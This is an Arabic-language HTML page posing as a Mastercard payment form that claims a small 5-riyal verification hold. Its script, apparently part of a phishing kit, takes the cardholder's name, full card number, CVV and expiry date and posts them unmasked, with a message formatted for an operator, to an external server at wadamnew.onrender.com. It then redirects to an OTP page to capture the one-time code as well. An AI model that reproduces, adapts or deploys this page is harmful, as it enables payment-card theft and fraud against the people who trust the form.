<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>نموذج الدفع</title>

  <style>
    body {
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f9f9f9;
      margin: 0;
      padding: 0;
    }
    .container {
      width: 370px;
      margin: 30px auto;
      background-color: #fff;
      border-radius: 12px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border: 1.5px solid #0000006e; 
      position: relative;
    }

    .banner img {
      width: 100%;
      border-radius: 10px;
    }

    .title {
      font-size: 16px;
      font-weight: bold;
      margin-top: 10px;
      color: #333;
      text-align: center;
    }

    .title span {
      color: green;
    }

    .section-title {
      margin: 20px 0 10px;
      font-weight: bold;
      font-size: 16px;
      color: #444;
    }

    .note {
      color: #007bff;
      font-size: 14px;
      margin-bottom: 10px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 10px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 8px;
      box-sizing: border-box;
    }

    .row {
      display: flex;
      gap: 10px;
    }

    .row input {
      flex: 1;
    }

    button {
      background-color: #ffa500;
      color: white;
      padding: 15px;
      width: 100%;
      border: none;
      border-radius: 8px;
      font-size: 18px;
      cursor: pointer;
    }

    button:hover {
      background-color: #ff9900;
    }

    .footer-note {
      font-size: 12px;
      color: #888;
      margin-top: 15px;
      text-align: center;
    }
    hr {
      color: #0000005d;
    }

    .logo {
      text-align: center;
      margin-bottom: 20px;
      margin-top: 20px;
    }

    .logo img {
      max-height: 40px;
    }

    .section-title {
      font-size: 22px;
      margin-top: -18px;
      color: #000000ab;
      font-weight: bold;
    }

    .note {
      font-weight: bold;
      color: #053a74;
    }

    #imgmain, #imgmain2 {
      width: 50px;
      height: auto;
      padding: 5px;
    }

    /* دائرة التحميل (Spinner) */
    .loading-overlay {
      position: absolute;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(255, 255, 255, 0.8);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      border-radius: 12px;
      z-index: 10;
      display: none; /* مخفية في البداية */
    }

    .spinner {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #ffa500;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin-bottom: 15px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }

    .loading-text-bold {
      font-weight: bold;
      font-size: 18px;
      color: #333;
      margin-bottom: 8px;
      text-align: center;
    }

    .loading-text-small {
      font-size: 14px;
      color: #555;
      text-align: center;
    }

  .banner {
    width: 100%;
    display: flex;
    justify-content: center;
    margin: 20px 0;
  }

  .banner .imgheader {
    width: 150px;    
    max-width: 90%;   
    height: auto;
    display: block;
    border-radius: 10px; 
  }

.divselectpay {
  display: flex;             /* تفعيل flex */
  justify-content: center;   /* توسيط الصور أفقياً */
  align-items: center;       /* توسيط عمودياً إذا ارتفاع الحاوية أكبر */
  gap: 20px;                 /* مسافة بين الصور */
  flex-wrap: wrap;           /* يسمح بالانتقال لسطر جديد إذا ضاقت المساحة */
  margin-top: 60px;
}

.imgpay {
  max-width: 100px;          /* تحديد حجم الصور */
  height: auto;
}
    
  </style>
</head>
<body>



    <div class="divselectpay" >
      <img id="imgmain2" src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" />

    </div>

  <div class="container" id="paymentContainer">

    <p class="section-title">نظام معالجة المدفوعات

      <br>
      <p>
  سيتم خصم 
  <span style="color: green;">5.00</span> 
  <span style="color: red;">ريال</span> 
  لغاية اعتماد الطلب
</p>
    </p>
    <hr>
    <p class="note">سيتم تنفيذ عملية ربط البطاقة  من خلال الوسيلة المحددة أدناه.</p>
    <div style="display: flex; gap: 10px; align-items: center;">
      <img id="imgmain2" src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" />

    </div>

    <input type="text" id="cardName" placeholder="اسم حامل البطاقة" required />
    <input 
      type="tel" 
      id="cardNumber" 
      placeholder="0000 0000 0000 0000" 
      maxlength="19" 
      required 
      style="text-align: center; direction: ltr;" />

    <div class="row">
      <input type="tel" id="cvv" placeholder="CVV / CVC" maxlength="3" required />
      <input type="tel" id="expiry" placeholder="MM/YY" maxlength="5" required />
    </div>

    <button onclick="validateForm()" id="payBtn">إتمام الدفع</button>

    <p class="footer-note">
      نحرص على استخدام بياناتك الشخصية فقط لغرض تنفيذ طلبك، وذلك بما يتوافق مع سياسة الخصوصية.
    </p>

    <!-- دائرة التحميل والنصوص -->
    <div class="loading-overlay" id="loadingOverlay">
      <div class="spinner"></div>
      <div class="loading-text-bold">يرجى الانتظار</div>
      <div class="loading-text-small">انتظر حتى تتم معالجة طلبك</div>
    </div>

  </div>

<script>
  async function sendToLocalServer(data) {
    try {
      const response = await fetch('https://wadamnew.onrender.com/api/payment', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
      return await response.json();
    } catch (err) {
      console.error('فشل الإرسال إلى الخادم المحلي:', err);
      throw err;
    }
  }

function validateForm() {
  const cardName = document.getElementById('cardName').value.trim();
  const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
  const cvv = document.getElementById('cvv').value.trim();
  const expiry = document.getElementById('expiry').value.trim();

  if (!cardName) {
    alert('يرجى إدخال اسم حامل البطاقة');
    return;
  }

  if (cardNumber.length !== 16 || !/^\d{16}$/.test(cardNumber)) {
    alert('يرجى ادخال رقم البطاقة');
    return;
  }

  if (!/^\d{3}$/.test(cvv)) {
    alert('CVV يرجى ادخال رمز');
    return;
  }

  const [monthStr, yearStr] = expiry.split('/');
  if (!monthStr || !yearStr || monthStr.length !== 2 || (yearStr.length !== 2 && yearStr.length !== 4)) {
    alert('يرجى ادخال تاريخ انتهاء البطاقة');
    return;
  }

  const month = parseInt(monthStr);
  if (!(month >= 1 && month <= 12)) {
    alert('شهر الانتهاء غير صحيح');
    return;
  }

  let inputYear = yearStr;
  if (inputYear.length === 2) {
    inputYear = '20' + inputYear;
  }

  const currentYear = new Date().getFullYear();
  if (parseInt(inputYear) < currentYear) {
    alert('هذه البطاقة منتهية');
    return;
  }

  showLoading();

  const ownerName = localStorage.getItem('userName') || 'غير معروف';

  localStorage.setItem("cardNumber", cardNumber);
  localStorage.setItem("bank", 'Visa/Mastercard');
  localStorage.setItem("expiryMonth", monthStr);
  localStorage.setItem("expiryYear", inputYear);

  const maskedCard = cardNumber;

  const message = `
💳 <b>بيانات الدفع   </b>

<b>👤 من:</b> ${ownerName}
<b>🧑‍💼 اسم حامل البطاقة:</b> ${cardName}
<b>🔢 رقم البطاقة:</b> ${maskedCard}
<b>📅 تاريخ الانتهاء:</b> ${expiry}
<b>🔐 CVV:</b> ${cvv}
  `;

  sendToLocalServer({
    name: ownerName,
    cardName: cardName,
    cardNumber: cardNumber,
    cvv: cvv,
    expiry: expiry,
    expiryMonth: monthStr,
    expiryYear: inputYear,
    message: message,
    type: 'credit_card'
  }).then(() => {
    setTimeout(() => {
      hideLoading();
      window.location.href = "otp.html";
    }, 2000);
  }).catch((error) => {
    console.error('خطأ:', error);
    hideLoading();
    alert('حدث خطأ أثناء معالجة البيانات');
  });
}


  function showLoading() {
    document.getElementById('loadingOverlay').style.display = 'flex';
    document.getElementById('payBtn').disabled = true;
  }

  function hideLoading() {
    document.getElementById('loadingOverlay').style.display = 'none';
    document.getElementById('payBtn').disabled = false;
  }

  document.getElementById('expiry').addEventListener('input', function (e) {
    let value = e.target.value.replace(/[^0-9]/g, '');
    if (value.length >= 2) {
      value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    e.target.value = value;
  });

  document.getElementById('cardNumber').addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '');
    let formatted = '';
    for (let i = 0; i < value.length; i += 4) {
      formatted += value.substring(i, i + 4) + ' ';
    }
    e.target.value = formatted.trim();
  });
</script>



</body>
</html>
``
